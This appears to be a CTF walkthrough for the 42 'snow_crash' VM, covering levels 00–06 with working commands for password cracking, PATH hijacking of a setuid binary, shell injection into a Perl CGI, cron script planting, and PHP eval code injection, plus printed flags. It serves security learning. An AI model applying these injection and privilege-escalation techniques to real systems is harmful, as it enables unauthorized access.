# snow\_crash

This is a CTF made in 42. The flags, you gotta catch them all. At each level
there is a way to hack yourself to the next level by finding the flag which is
the password for the next user.

## Setup

```shell
# launch the snow_crash vm with qemu
./vm_lauch.bash
# connect to it with ssh (pass: level00)
ssh -p 2222 level00@localhost
```

> The vm\_launch.bash script takes an optional parameter for the ISO path.

## Caesar Cipher (level00)

The password for the user flag00 is located in the file `/usr/sbin/john`. It is
a plaintext file containing a string encrypted with a
[caesar cipher](https://en.wikipedia.org/wiki/Caesar_cipher). This is a classic
and simple symetric encryption scheme which uses a key for rotating the
characters in a text. Here the key is -11. This is means that each letter in the
text has been shifted on the left eleven times. To decrypt the password we need
to do the inverse operation, which is a right shift of the same value.

| Cipher | c | d | i | i | d | d | w | p | g | s | w | t | g | t |
|:------:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| Plain  | n | o | t | t | o | o | h | a | r | d | h | e | r | e |

## Broken DES (level01)

The second level is as simple as running john the ripper on flag01's password
hash, as it is subtly hinted at by the first level's password filename.

```shell
# copy the passwd file from the virtual machine (with level00 as a password)
scp -P 2222 level00@localhost:/etc/passwd .
# pass it through john the ripper
john --show passwd
```

This should output something like that:

```
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```

Where `abcdefg` is the password for flag01. It works because here the legacy
unix password hashing function `crypt` is used for encrypting the user's
password. It is based on a modified version of
[DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard) to turn it into a
one-way function but it is not secure anymore, especially when the password is
as simple as it is here.

## Wireshark packet dump (level02)

Here you have a .pcap file at the root of the home directory. This contains a
list of TCP packets captured with wireshark. The password is contained in the
payloads of the TCP packets after the `Password:` string (which is really a
prompt). Each TCP payload is one byte long and represents an input from the user
logging into this insecure online service. The input ends with a 0x0d, which is
a form feed character meaning that the input is done.

To read the file simply copy it from the virtual machine and open it with
wireshark.

```shell
# copy the file from the vm (with the flag from the last level)
scp -P 2222 level02@localhost:~/level02.pcap .
# change its permissions to open it
chmod 644 level02.pcap
# read it with wireshark
wireshark level02.pcap
```

> If you dont have wireshark or cannot install it (like on 42's machines), just
> use the tshark.bash script in level02's Resources directory. It will read it
> and print each TCP payload from the pcap file: `./tshark.bash`.

Note that some of the payloads of the password are 0x7f. This is the DEL
character, which means the user screwed up and deleted part of his input. So _n_
preceding characters need to be deleted, where _n_ is the number of DEL in a
row. The final password is: `ft_waNDReL0L`.

## Use the PATH luke (level03)

Here we have binary owned by the flag03 user and the setuid bit on. The level03
user has execution rights on it, which means that whatever it does will be done
as if it was the user flag03 that executed it.

By running the binary through gdb and breaking in main, we can see that it calls
the `system` function to execute an echo command.

```shell
# run gdb on the binary
gdb ./level03
# set a breakpoint at the main function (through gdb's prompt)
(gdb) b main
# run the program
(gdb) run
# see the assembly code being executed
(gdb) disass
```

At the end of the assembly instruction list, we can see these two lines:

```
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
```

The first instruction loads a parameter into esp for the system function call
on the next line. When printing the string being passed to it (as it is what
[system](https://man7.org/linux/man-pages/man3/system.3.html) takes as a
parameter), we can see which command will be executed:

```
# print the parameter
(gdb) p (char *)0x80485e0
# outputs
$1 = 0x80485e0 "/usr/bin/env echo Exploit me"
```

Since the echo binary is explicitely located through the env command and not
hardcoded with an absolute path, we can use the `PATH` environment variable of
the shell to execute arbitrary code:

```shell
# write the script that will be executed by the system call
cat << END > /tmp/echo
#!/bin/bash

/usr/bin/id
/bin/getflag
END
# make it executable
chmod +x /tmp/echo
# run the binary and make the shell look into /tmp for the echo command
PATH=/tmp ./level03
```

Which will output:

```
uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## CGI bad (level04)

The perl script at the root the home is a CGI file. It is used to render web
pages dynamically. The corresponding page, as it is nicely pointed out by the
comment in the script, is served on localhost:4747.

> If you are using the `vm_launch.bash` script, the 4747 port is mapped to 3333,
> so you can see the page on localhost:3333.

There is nothing to be showed right now. But like in the last exercise, the perl
script has the setuid bit on and belongs to flag04. In it we can see a backtick
syntax with an echo command and what looks like variable substitution with '$y'.

Just give 'x=something' as a get parameter to the page to see 'something' in it
through the echo command. Since it's a shell command just pass ';getflag' to it:

```
http://localhost:3333/?x=%3bgetflag
```

Where '3b' is the ascii hexcode for ';'. Then see the token on the page :)

## Be careful what you script for (level05)

The level05 home is empty. If we look inside /usr/sbin/ we can see that there
is a script named 'openarenaserver' that belongs to flag05. It executes every
bash script in the '/opt/openarenaserver' directory, on which level05 has full
access. The script typically looks like it is executed with a cronjob, so all we
have to do is write a script that will call the `getflag` command and save the
output to a file:

```shell
# write this script in the directory
cat << END > /opt/openarenaserver/script
getflag > /tmp/flag
END
# wait for the flag file to appear (or just spam `cat /tmp/flag` like a retard)
while [ ! -f /tmp/flag ]; do sleep 1; done; cat /tmp/flag
```

## Breaking out of PHP regex hell (level06)

The level06 is a setuid binary that takes two arguments and passes them to an
overly convoluted php script that it executes. It has a regex with the '\e'
option, which means it evaluates the code inside it as php code and executes it.
So this is our obvious way in. The less obvious thing is to find what the
arguments are to exploit the script.

The first argument must be a file since the `file_get_contents` function is
called on it. The second one is a string of php code that will be executed if
the contents of the file do match the '\e' regex.

```shell
# set the file to match the regex
cat << END > /tmp/hell_regex_match
[x {${eval($z)}}]
END
# call the binary with the file and the code to execute
./level06 /tmp/hell_regex_match 'shell_exec("getflag > /tmp/flag");'
# get the flag
cat /tmp/flag
```

Although, there is a way simpler solution. By default, when logging in with a
user, the home does not have write permissions on. However, since the user
obviously owns its home directory he can change that. This means we can delete
the orginal file and replace it with our own:

```shell
# change directory permissions
chmod 755 .
# delete annoying php script
rm level06.php
# replace it by what we want to execute
cat << END > level06.php
<?php
shell_exec("getflag > /tmp/flag");
?>
END
# run the script through the binary
./level06
# get the flag
cat /tmp/flag
```
